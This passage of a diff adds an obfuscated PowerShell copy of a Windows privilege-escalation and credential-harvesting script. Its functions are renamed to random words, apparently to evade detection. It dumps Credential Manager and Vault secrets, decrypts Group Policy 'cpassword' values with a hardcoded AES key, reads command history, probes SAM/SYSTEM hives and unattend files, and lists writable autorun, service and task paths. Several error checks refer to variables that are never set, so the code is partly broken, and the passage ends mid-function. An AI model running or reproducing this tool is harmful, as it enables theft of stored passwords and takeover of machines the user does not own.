+            $vgDUXUWM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($JaTChMZW99, [type] [PrivescCheck.Win32+CREDENTIAL])
+            $UjnJKhXv99 = enormous -qotFgfjr99 $vgDUXUWM99
+            if (-not [String]::IsNullOrEmpty($UjnJKhXv99)) {
+                $DRHGDKdF99 = New-Object -TypeName PSObject 
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "TargetName" -Value $vgDUXUWM99.TargetName
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $vgDUXUWM99.UserName
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "Comment" -Value $vgDUXUWM99.Comment
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "$($vgDUXUWM99.Type) - $(sandwiching -Type $vgDUXUWM99.Type)"
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "Persist" -Value "$($vgDUXUWM99.Persist) - $(uncorroborated -uvRTqRGO99 $vgDUXUWM99.Persist)"
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "Flags" -Value "0x$($vgDUXUWM99.Flags.ToString('X8'))"
+                $DRHGDKdF99 | Add-Member -MemberType "NoteProperty" -Name "Credential" -Value $UjnJKhXv99
+                $DRHGDKdF99
+            }
+        }
+        [PrivescCheck.Win32]::CredFree($HVIQaHhr99) 
+    } else {
+        Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+    }
+}
+function herbicide {
+    
+    [CmdletBinding()] param()
+    function tritely {
+        [CmdletBinding()] param(
+            [Guid] $xvTCUrqa99
+        )
+        $FbcDrgCS99 = @{
+            ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
+            ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
+            ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
+            ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
+            ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
+            ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
+            ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
+            ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
+        }
+        $FbcDrgCS99[$xvTCUrqa99]
+    }
+    function slaking {
+        [CmdletBinding()] param(
+            [IntPtr] $WLZOudpS99
+        )
+        if ($WLZOudpS99 -eq [IntPtr]::Zero) {
+            return
+        }
+        $EoFWtaXd99 = [Runtime.InteropServices.Marshal]::PtrToStructure($WLZOudpS99, [type] [PrivescCheck.Win32+VAULT_ITEM_DATA_HEADER])
+        $nUqkwpPB99 = [IntPtr] ($WLZOudpS99.ToInt64() + 16)
+        switch ($EoFWtaXd99.Type) {
+            0x00 {
+                [Bool] [Runtime.InteropServices.Marshal]::ReadByte($nUqkwpPB99)
+            }
+            0x01 {
+                [Runtime.InteropServices.Marshal]::ReadInt16($nUqkwpPB99)
+            }
+            0x02 {
+                [Runtime.InteropServices.Marshal]::ReadInt16($nUqkwpPB99)
+            }
+            0x03 {
+                [Runtime.InteropServices.Marshal]::ReadInt32($nUqkwpPB99)
+            }
+            0x04 {
+                [Runtime.InteropServices.Marshal]::ReadInt32($nUqkwpPB99)
+            }
+            0x05 {
+                [Runtime.InteropServices.Marshal]::PtrToStructure($nUqkwpPB99, [Type] [Double])
+            }
+            0x06 {
+                [Runtime.InteropServices.Marshal]::PtrToStructure($nUqkwpPB99, [Type] [Guid])
+            }
+            0x07 { 
+                $OmPsIkiA99 = [Runtime.InteropServices.Marshal]::ReadIntPtr($nUqkwpPB99)
+                [Runtime.InteropServices.Marshal]::PtrToStringUni($OmPsIkiA99)
+            }
+            0x08 {
+            }
+            0x09 {
+            }
+            0x0a {
+            }
+            0x0b {
+            }
+            0x0c {
+                $zMuDYkAk99 = [Runtime.InteropServices.Marshal]::ReadIntPtr($nUqkwpPB99)
+                $PKbbBBjg99 = [Security.Principal.SecurityIdentifier] ($zMuDYkAk99)
+                $PKbbBBjg99.Value
+            }
+            0x0d {
+                
+            }
+        }
+    }
+    $eNTEtYqD99 = 0
+    $JFdxjHIR99 = [IntPtr]::Zero 
+    $XwsMixSg99 = [PrivescCheck.Win32]::VaultEnumerateVaults(0, [ref]$eNTEtYqD99, [ref]$JFdxjHIR99)
+    if ($XwsMixSg99 -eq 0) {
+        Write-Verbose "VaultEnumerateVaults() OK - Count: $($eNTEtYqD99)"
+        for ($i = 0; $i -lt $eNTEtYqD99; $i++) {
+            $LJvRFTkQ99 = [IntPtr] ($JFdxjHIR99.ToInt64() + ($i * [Runtime.InteropServices.Marshal]::SizeOf([Type] [Guid])))
+            $xvTCUrqa99 = [Runtime.InteropServices.Marshal]::PtrToStructure($LJvRFTkQ99, [type] [Guid])
+            $FsqEPVAh99 = tritely -xvTCUrqa99 $xvTCUrqa99
+            Write-Verbose "Vault: $($xvTCUrqa99) - $($FsqEPVAh99)"
+            $DKArnVgH99 = [IntPtr]::Zero 
+            $XwsMixSg99 = [PrivescCheck.Win32]::VaultOpenVault($LJvRFTkQ99, 0, [ref]$DKArnVgH99)
+            if ($XwsMixSg99 -eq 0) {
+                Write-Verbose "VaultOpenVault() OK - Vault Handle: 0x$($DKArnVgH99.ToString('X8'))"
+                $FakJbpKE99 = 0
+                $fHOgcVWg99 = [IntPtr]::Zero 
+                $XwsMixSg99 = [PrivescCheck.Win32]::VaultEnumerateItems($DKArnVgH99, 0x0200, [ref]$FakJbpKE99, [ref]$fHOgcVWg99)
+                $XMgtswQT99 = $fHOgcVWg99
+                if ($XwsMixSg99 -eq 0) {
+                    Write-Verbose "VaultEnumerateItems() OK - Items Count: $($FakJbpKE99)"
+                    $QGgQyZuh99 = [Environment]::OSVersion.Version
+                    try {
+                        for ($j = 0; $j -lt $FakJbpKE99; $j++) {
+                            if ($QGgQyZuh99.Major -le 6 -and $QGgQyZuh99.Minor -le 1) {
+                                $OHZzqMXS99 = [type] [PrivescCheck.Win32+VAULT_ITEM_7]
+                            } else {
+                                $OHZzqMXS99 = [type] [PrivescCheck.Win32+VAULT_ITEM_8]
+                            }
+    
+                            $kjNPHOyF99 = [Runtime.InteropServices.Marshal]::PtrToStructure($XMgtswQT99, [type] $OHZzqMXS99)
+    
+                            if ($QGgQyZuh99.Major -le 6 -and $QGgQyZuh99.Minor -le 1) {
+                                $KxqcshBn99 = [IntPtr]::Zero
+                                $XwsMixSg99 = [PrivescCheck.Win32]::VaultGetItem7($DKArnVgH99, [ref]$kjNPHOyF99.SchemaId, $kjNPHOyF99.Resource, $kjNPHOyF99.Identity, [IntPtr]::Zero, 0, [ref]$KxqcshBn99)
+                            } else {
+                                $KxqcshBn99 = [IntPtr]::Zero
+                                $XwsMixSg99 = [PrivescCheck.Win32]::VaultGetItem8($DKArnVgH99, [ref]$kjNPHOyF99.SchemaId, $kjNPHOyF99.Resource, $kjNPHOyF99.Identity, $kjNPHOyF99.PackageSid, [IntPtr]::Zero, 0, [ref]$KxqcshBn99)
+                            }
+    
+                            if ($XwsMixSg99 -eq 0) {
+                                Write-Verbose "VaultGetItem() OK - ItemPtr: 0x$($KxqcshBn99.ToString('X8'))"
+                                $lwBAsQzW99 = [Runtime.InteropServices.Marshal]::PtrToStructure($KxqcshBn99, [Type] $OHZzqMXS99)
+                                $YpZabYIp99 = slaking -WLZOudpS99 $lwBAsQzW99.Authenticator
+                                [PrivescCheck.Win32]::VaultFree($KxqcshBn99) | Out-Null 
+                            } else {
+                                Write-Verbose "VaultGetItem() failed - Err: 0x$($XwsMixSg99.ToString('X8'))"
+                            }
+    
+                            if (-not [String]::IsNullOrEmpty($YpZabYIp99)) {
+                                $Item = New-Object -TypeName PSObject
+                                $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $FsqEPVAh99
+                                $Item | Add-Member -MemberType "NoteProperty" -Name "TargetName" -Value $(slaking -WLZOudpS99 $kjNPHOyF99.Resource)
+                                $Item | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $(slaking -WLZOudpS99 $kjNPHOyF99.Identity)
+                                $Item | Add-Member -MemberType "NoteProperty" -Name "Credential" -Value $YpZabYIp99
+                                $Item | Add-Member -MemberType "NoteProperty" -Name "LastWritten" -Value $([DateTime]::FromFileTimeUtc($kjNPHOyF99.LastWritten))
+                                $Item
+                            }
+                            $XMgtswQT99 = [IntPtr] ($XMgtswQT99.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] $OHZzqMXS99))
+                        }
+                    } catch [Exception] {
+                        Write-Verbose $_.Exception.Message 
+                    }
+                } else {
+                    Write-Verbose "VaultEnumerateItems() failed - Err: 0x$($XwsMixSg99.ToString('X8'))"
+                }
+                [PrivescCheck.Win32]::VaultCloseVault([ref]$DKArnVgH99) | Out-Null 
+            } else {
+                Write-Verbose "VaultOpenVault() failed - Err: 0x$($XwsMixSg99.ToString('X8'))"
+            }
+        }
+    } else {
+        Write-Verbose "VaultEnumerateVaults() failed - Err: 0x$($XwsMixSg99.ToString('X8'))"
+    }
+}
+function becalms {
+    [CmdletBinding()] param(
+        [switch]$MEVqQNIH99
+    )
+    try {
+        Add-Type -Assembly System.Security
+        Add-Type -Assembly System.Core
+    } catch {
+    }
+    function man {
+        [CmdletBinding()] param(
+            [string] $MsBkBXCq99 
+        )
+        if (-not [String]::IsNullOrEmpty($MsBkBXCq99)) {
+            $Mod = $MsBkBXCq99.Length % 4
+            if ($Mod -gt 0) {
+                $MsBkBXCq99 += "=" * (4 - $Mod)
+            }
+            $yOlZDycu99 = [Convert]::FromBase64String($MsBkBXCq99)
+            try {
+                $fRjGhgrj99 = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+                [Byte[]] $FohAXGfD99 = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+                $AesIV = New-Object Byte[]($fRjGhgrj99.IV.Length) 
+                $fRjGhgrj99.IV = $AesIV
+                $fRjGhgrj99.Key = $FohAXGfD99
+                $MrHsafKZ99 = $fRjGhgrj99.CreateDecryptor() 
+                [Byte[]] $OZyDoXCV99 = $MrHsafKZ99.TransformFinalBlock($yOlZDycu99, 0, $yOlZDycu99.length)
+                [System.Text.UnicodeEncoding]::Unicode.GetString($OZyDoXCV99)
+            } catch [Exception] {
+                Write-Verbose $_.Exception.Message
+            }
+        }
+    }
+    if ($MEVqQNIH99) {
+        $olCIVPml99 = "\\$($Env:USERDNSDOMAIN)\SYSVOL"
+    } else {
+        $olCIVPml99 = $Env:ALLUSERSPROFILE
+        if ($olCIVPml99 -notmatch "ProgramData") {
+            $olCIVPml99 = Join-Path -Path $olCIVPml99 -ChildPath "Application Data"
+        } else {
+            $olCIVPml99 = Join-Path -Path $olCIVPml99 -ChildPath "Microsoft\Group Policy"
+        }
+    }
+    
+    if (Test-Path -Path $olCIVPml99 -ErrorAction SilentlyContinue) {
+        $CyiWLgaM99 = Get-ChildItem -Path $olCIVPml99 -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Drives.xml','Printers.xml' -Force -ErrorAction SilentlyContinue
+        foreach ($File in $CyiWLgaM99) {
+            
+            $OFbUICQl99 = $File.FullName 
+            Write-Verbose $OFbUICQl99
+            try {
+                [xml]$vCnFHBrn99 = Get-Content -Path $OFbUICQl99 -ErrorAction SilentlyContinue
+            } catch [Exception] {
+                Write-Verbose $_.Exception.Message 
+            }
+            if ($Null -eq $vCnFHBrn99) {
+                continue
+            }
+            $vCnFHBrn99.GetElementsByTagName("Properties") | ForEach-Object {
+                $LsjTNVxz99 = $_ 
+                $MsBkBXCq99 = ""
+                switch ($File.BaseName) {
+                    Groups {
+                        $Type = "User/Group"
+                        $BDbTKBEl99 = $LsjTNVxz99.userName 
+                        $MsBkBXCq99 = $LsjTNVxz99.cpassword 
+                        $VnJXOneG99 = "Description: $($LsjTNVxz99.description)"
+                    }
+    
+                    Scheduledtasks {
+                        $Type = "Scheduled Task"
+                        $BDbTKBEl99 = $LsjTNVxz99.runAs 
+                        $MsBkBXCq99 = $LsjTNVxz99.cpassword 
+                        $VnJXOneG99 = "App: $($LsjTNVxz99.appName) $($LsjTNVxz99.args)"
+                    }
+    
+                    DataSources {
+                        $Type = "Data Source"
+                        $BDbTKBEl99 = $LsjTNVxz99.username 
+                        $MsBkBXCq99 = $LsjTNVxz99.cpassword 
+                        $VnJXOneG99 = "DSN: $($LsjTNVxz99.dsn)"
+                    }
+    
+                    Drives {
+                        $Type = "Mapped Drive"
+                        $BDbTKBEl99 = $LsjTNVxz99.userName 
+                        $MsBkBXCq99 = $LsjTNVxz99.cpassword 
+                        $VnJXOneG99 = "Path: $($LsjTNVxz99.path)"
+                    }
+    
+                    Services {
+                        $Type = "Service"
+                        $BDbTKBEl99 = $LsjTNVxz99.accountName 
+                        $MsBkBXCq99 = $LsjTNVxz99.cpassword 
+                        $VnJXOneG99 = "Name: $($LsjTNVxz99.serviceName)"
+                    }
+                    Printers {
+                        $Type = "Printer"
+                        $BDbTKBEl99 = $LsjTNVxz99.username 
+                        $MsBkBXCq99 = $LsjTNVxz99.cpassword 
+                        $VnJXOneG99 = "Path: $($LsjTNVxz99.path)"
+                    }
+                }
+                if (-not [String]::IsNullOrEmpty($MsBkBXCq99)) {
+                    $Item = New-Object -TypeName PSObject
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $Type
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "UserName" -Value $BDbTKBEl99
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $(man -MsBkBXCq99 $MsBkBXCq99)
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Content" -Value $VnJXOneG99
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "Changed" -Value $LsjTNVxz99.ParentNode.changed
+                    $Item | Add-Member -MemberType "NoteProperty" -Name "FilePath" -Value $OFbUICQl99
+                    $Item
+                }
+            }
+        }
+    }
+}
+function freethinker {
+    $ziDdCvKk99 = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    $vylkLNOL99 = Get-Content -Path $ziDdCvKk99 -ErrorAction SilentlyContinue -ErrorVariable ErrorGetContent
+    if (-not $VxEvVtxA99) {
+        $oslRzeFs99 = $vylkLNOL99.Count
+        $UhUViPZz99 = $vylkLNOL99 | Select-String -Pattern $jGTFLwlO99 -AllMatches
+        $RRXMgUnV99 = $UhUViPZz99.Count
+        $FjbmgoRF99 = Get-Item -Path $ziDdCvKk99
+        $Item = New-Object -TypeName PSObject
+        $Item | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $ziDdCvKk99
+        $Item | Add-Member -MemberType "NoteProperty" -Name "CreationTime" -Value $FjbmgoRF99.CreationTime
+        $Item | Add-Member -MemberType "NoteProperty" -Name "LastWriteTime" -Value $FjbmgoRF99.LastWriteTime
+        $Item | Add-Member -MemberType "NoteProperty" -Name "Lines" -Value $oslRzeFs99
+        $Item | Add-Member -MemberType "NoteProperty" -Name "Matches" -Value $RRXMgUnV99
+        $Item
+    }
+}
+function petitioners {
+    
+    [CmdletBinding()] param()
+    $qclHXUfp99 = New-Object System.Collections.ArrayList 
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\SAM"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\SAM"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SAM"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:SystemRoot -ChildPath "repair\system"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\SYSTEM"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:SystemRoot -ChildPath "System32\config\RegBack\system"))
+    ForEach ($Path in [string[]]$qclHXUfp99) {
+        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 
+            Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError | Out-Null 
+            if (-not $icsLKeBl99) {
+                $oDMIDJNp99 = New-Object -TypeName PSObject 
+                $oDMIDJNp99 | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $Path 
+                $oDMIDJNp99
+            } 
+        }
+    }
+}
+function archiving {
+    [CmdletBinding()] param()
+    $qclHXUfp99 = New-Object System.Collections.ArrayList 
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattended.xml"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend.xml"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend\Unattended.xml"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:windir -ChildPath "Panther\Unattend\Unattend.xml"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:windir -ChildPath "System32\Sysprep\Unattend.xml"))
+    [void]$qclHXUfp99.Add($(Join-Path -Path $env:windir -ChildPath "System32\Sysprep\Panther\Unattend.xml"))
+    ForEach ($Path in [string[]]$qclHXUfp99) {
+        if (Test-Path -Path $Path -ErrorAction SilentlyContinue) { 
+            Write-Verbose "Found file: $Path"
+            $XwsMixSg99 = amiability -Path $Path 
+            if ($XwsMixSg99) {
+                $XwsMixSg99 | Add-Member -MemberType "NoteProperty" -Name "File" -Value $Path 
+                $XwsMixSg99
+            }
+        }
+    }
+}
+function Mujib {
+    
+    [CmdletBinding()] param()
+    $jfITQKHd99 = New-Object System.Collections.ArrayList 
+    $Items = ampere -ovMLtgnb99
+    ForEach ($Item in $Items) {
+        $RFxWcunO99 = $Item.Name 
+        $RHHCGVaG99 = $Item.FullName
+        $bxPykjWg99 = New-Object -TypeName PSObject 
+        $bxPykjWg99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RFxWcunO99
+        $bxPykjWg99 | Add-Member -MemberType "NoteProperty" -Name "FullPath" -Value $RHHCGVaG99
+        [void]$jfITQKHd99.Add($bxPykjWg99)
+    }
+    
+    $jfITQKHd99
+}
+function formulated {
+    
+    [CmdletBinding()] param()
+    $Items = ampere -ovMLtgnb99
+    ForEach ($Item in $Items) {
+        
+        $pbihOgLU99 = New-Object -TypeName System.Collections.ArrayList
+        [void]$pbihOgLU99.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*")) # Do this to avoid the use of -Depth which is PSH5+
+        [void]$pbihOgLU99.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*\*")) # Do this to avoid the use of -Depth which is PSH5+
+        
+        $QKQCBsey99 = Get-ChildItem -Path $pbihOgLU99 -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
+        
+        if (-not $MeyhqiiW99) {
+            $QKQCBsey99 | ForEach-Object {
+                if ($_ -is [System.IO.DirectoryInfo]) {
+                    $kMUMMuUD99 = $_ | ruined -loyqyiRW99
+                } else {
+                    if ($_.FullName -Like "*.exe" -or $_.FullName -Like "*.dll") {
+                        $kMUMMuUD99 = $_ | ruined -loyqyiRW99 
+                    }
+                }
+                if ($kMUMMuUD99) {
+                    ForEach ($Path in $kMUMMuUD99) {
+                        if ($Path.ModifiablePath -eq $_.FullName) {
+                            $Path
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+function dons {
+    [CmdletBinding()] param()
+    $VTtgcCNo99 = @("Microsoft", "Microsoft OneDrive", "Package Cache", "Packages", "SoftwareDistribution", "ssh", "USOPrivate", "USOShared", "")
+    Get-ChildItem -Path $env:ProgramData | ForEach-Object {
+    
+        if ($_ -is [System.IO.DirectoryInfo] -and (-not ($VTtgcCNo99 -contains $_.Name))) {
+    
+            $_ | Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                        
+                $_ | ruined -loyqyiRW99 | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} 
+            }
+        }
+    }
+}
+function fiascos {
+    [CmdletBinding()] param()
+    [string[]]$ghHpChZK99 = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+    $ghHpChZK99 | ForEach-Object {
+        $eYhGojTo99 = $_
+        $Item = Get-Item -Path "Registry::$($eYhGojTo99)" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem
+        if (-not $OwEwxdGA99) {
+            $Item | Select-Object -ExpandProperty Property | ForEach-Object {
+                $bNayDNup99 = $_
+                $PVbcvZfL99 = $Item.GetValue($bNayDNup99, "", "DoNotExpandEnvironmentNames")
+                if ($PVbcvZfL99 -and ($PVbcvZfL99 -ne '')) {
+                    $kMUMMuUD99 = $PVbcvZfL99 | ruined | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
+                    if (([object[]]$kMUMMuUD99).Length -gt 0) {
+                        $vqGtaqqH99 = $True 
+                    } else {
+                        $vqGtaqqH99 = $False 
+                    }
+    
+                    $XbClAjbO99 = New-Object -TypeName PSObject 
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $bNayDNup99
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Path" -Value "$($eYhGojTo99)\$($bNayDNup99)"
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Data" -Value $PVbcvZfL99
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $vqGtaqqH99
+                    $XbClAjbO99 
+                }
+            }
+        }
+    }
+    $Root = (Get-Item -Path $env:windir).PSDrive.Root
+    
+    [string[]]$mxHqcdYI99 = "\Users\All Users\Start Menu\Programs\Startup"
+    $mxHqcdYI99 | ForEach-Object {
+        $bQkPqqSA99 = Join-Path -Path $Root -ChildPath $_ 
+        Get-ChildItem -Path $bQkPqqSA99 -ErrorAction SilentlyContinue | ForEach-Object {
+            $vqPxuRQS99 = $_.Name
+            $JiIYPLrS99 = $_.FullName
+            if ($JiIYPLrS99 -Like "*.lnk") {
+                try {
+                    $Wsh = New-Object -ComObject WScript.Shell
+                    $ilvPiccP99 = $Wsh.CreateShortcut((Resolve-Path -Path $JiIYPLrS99))
+                    $kMUMMuUD99 = $ilvPiccP99.TargetPath | ruined -loyqyiRW99 | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
+                    if (([object[]]$kMUMMuUD99).Length -gt 0) {
+                        $vqGtaqqH99 = $True
+                    } else {
+                        $vqGtaqqH99 = $False
+                    }
+                    $XbClAjbO99 = New-Object -TypeName PSObject 
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $vqPxuRQS99
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $JiIYPLrS99
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "Data" -Value "$($ilvPiccP99.TargetPath) $($ilvPiccP99.Arguments)"
+                    $XbClAjbO99 | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $vqGtaqqH99
+                    $XbClAjbO99 
+                } catch {
+                }
+            }
+        }
+    }
+}
+function stopped {
+    fiascos | Where-Object { $_.IsModifiable }
+}
+function goriest {
+    [CmdletBinding()] param()
+    dissecting | Where-Object { -not $_.CurrentUserIsOwner } | ForEach-Object {
+        $VEmOqMrZ99 = $_
+        $VEmOqMrZ99.Command | ruined | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | ForEach-Object {
+            $VEmOqMrZ99 | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+            $VEmOqMrZ99 | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
+            $VEmOqMrZ99 | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
+            $VEmOqMrZ99
+        }
+    }
+}
+function protesters {
+    [CmdletBinding()] param()
+    dissecting | Where-Object { -not $_.CurrentUserIsOwner } | ForEach-Object {
+        $VEmOqMrZ99 = $_
+        Congress -Path $VEmOqMrZ99.Command | ForEach-Object {
+            $VEmOqMrZ99 | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+            $VEmOqMrZ99 | Add-Member -MemberType "NoteProperty" -Name "IdentityReference" -Value $_.IdentityReference
+            $VEmOqMrZ99 | Add-Member -MemberType "NoteProperty" -Name "Permissions" -Value $_.Permissions
+            $VEmOqMrZ99
+        }
+    }
+}
+function Golden {
+    
+    [CmdletBinding()] param(
+        [switch]
+        $Self = $False
+    )
+    $wFqXfgIk99 = $wFqXfgIk99 = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name 
+    $CroAGoMG99 = @("Idle", "services", "Memory Compression", "TrustedInstaller", "PresentationFontCache", "Registry", "ServiceShell", "System", 
+    "csrss", # Client/Server Runtime Subsystem
+    "dwm", # Desktop Window Manager
+    "msdtc", # Microsoft Distributed Transaction Coordinator
+    "smss", # Session Manager Subsystem
+    "svchost" # Service Host
+    )
+    $IzzcQdMu99 = Get-Process 
+    ForEach ($kbPzJOQE99 in $IzzcQdMu99) {
+        if (-not ($CroAGoMG99 -contains $kbPzJOQE99.Name )) {
+            $AcUSaDHY99 = (Get-UserFromProcess -ITXypsVd99 $kbPzJOQE99.Id).DisplayName
+            $cqXMpPDm99 = $False
+            if ($Self) {
+                if ($AcUSaDHY99 -eq $wFqXfgIk99) {
+                    $cqXMpPDm99 = $True 
+                }
+            } else {
+                if (-not ($AcUSaDHY99 -eq $wFqXfgIk99)) {
+                    $PpJqNwjg99 = Join-Path -Path $env:SystemRoot -ChildPath "System32"
+                    $PpJqNwjg99 = Join-Path -Path $PpJqNwjg99 -ChildPath "$($kbPzJOQE99.name).exe"
+                    if (-not (Test-Path -Path $PpJqNwjg99)) {
+                        $cqXMpPDm99 = $True 
+                    }
+                    $cqXMpPDm99 = $True 
+                }
+            }
+            if ($cqXMpPDm99) {
+                $LyhDkyzn99 = New-Object -TypeName PSObject 
+                $LyhDkyzn99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $kbPzJOQE99.Name 
+                $LyhDkyzn99 | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $kbPzJOQE99.Id 
+                $LyhDkyzn99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $(if ($AcUSaDHY99) { $AcUSaDHY99 } else { "N/A" })
+                $LyhDkyzn99 | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $kbPzJOQE99.Path 
+                $LyhDkyzn99 | Add-Member -MemberType "NoteProperty" -Name "SessionId" -Value $kbPzJOQE99.SessionId
+                $LyhDkyzn99
+            }
+        } else {
+            Write-Verbose "Ignored: $($kbPzJOQE99.Name)"
+        }
+    }
+}
+function slakes {
+    [OutputType('ServiceProcess.ServiceController')]
+    param (
+        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
+        [Alias('ServiceName')]
+        [String[]]
+        [ValidateNotNullOrEmpty()]
+        $Name,
+        [String[]]
+        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
+        $dyoofDjS99,
+        [String]
+        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
+        $PermissionSet = 'ChangeConfig'
+    )
+    BEGIN {
+        $AccessMask = @{
+            'QueryConfig'           = [uint32]'0x00000001'
+            'ChangeConfig'          = [uint32]'0x00000002'
+            'QueryStatus'           = [uint32]'0x00000004'
+            'EnumerateDependents'   = [uint32]'0x00000008'
+            'Start'                 = [uint32]'0x00000010'
+            'Stop'                  = [uint32]'0x00000020'
+            'PauseContinue'         = [uint32]'0x00000040'
+            'Interrogate'           = [uint32]'0x00000080'
+            'UserDefinedControl'    = [uint32]'0x00000100'
+            'Delete'                = [uint32]'0x00010000'
+            'ReadControl'           = [uint32]'0x00020000'
+            'WriteDac'              = [uint32]'0x00040000'
+            'WriteOwner'            = [uint32]'0x00080000'
+            'Synchronize'           = [uint32]'0x00100000'
+            'AccessSystemSecurity'  = [uint32]'0x01000000'
+            'GenericAll'            = [uint32]'0x10000000'
+            'GenericExecute'        = [uint32]'0x20000000'
+            'GenericWrite'          = [uint32]'0x40000000'
+            'GenericRead'           = [uint32]'0x80000000'
+            'AllAccess'             = [uint32]'0x000F01FF'
+        }
+        
+        $xmrNnhQv99 = $False
+        if($PSBoundParameters['Permissions']) {
+            $WyrhdgTp99 = $dyoofDjS99
+        }
+        else {
+            if($PermissionSet -eq 'ChangeConfig') {
+                $WyrhdgTp99 = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
+            }
+            elseif($PermissionSet -eq 'Restart') {
+                $WyrhdgTp99 = @('Start', 'Stop')
+                $xmrNnhQv99 = $True # so we check all permissions && style
+            }
+            elseif($PermissionSet -eq 'AllAccess') {
+                $WyrhdgTp99 = @('GenericAll', 'AllAccess')
+            }
+        }
+    }
+    PROCESS {
